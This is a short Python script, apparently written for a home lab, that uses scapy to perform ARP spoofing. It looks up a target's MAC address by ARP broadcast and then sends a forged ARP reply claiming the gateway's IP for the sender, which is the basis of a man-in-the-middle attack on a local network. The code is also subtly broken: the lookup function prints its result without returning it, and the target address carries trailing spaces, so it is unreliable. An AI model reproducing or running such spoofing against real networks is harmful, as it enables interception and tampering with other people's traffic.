
import scapy.all as scapy


def get_mac(ip) :
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    print(answered_list[0][1].show())
    # return answered_list.hwdst
def arp_spoof() :
    target_ip = "192.168.111.133    "
    target_mac = get_mac(target_ip)
    gateway_ip = "192.168.111.2"
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet)

arp_spoof()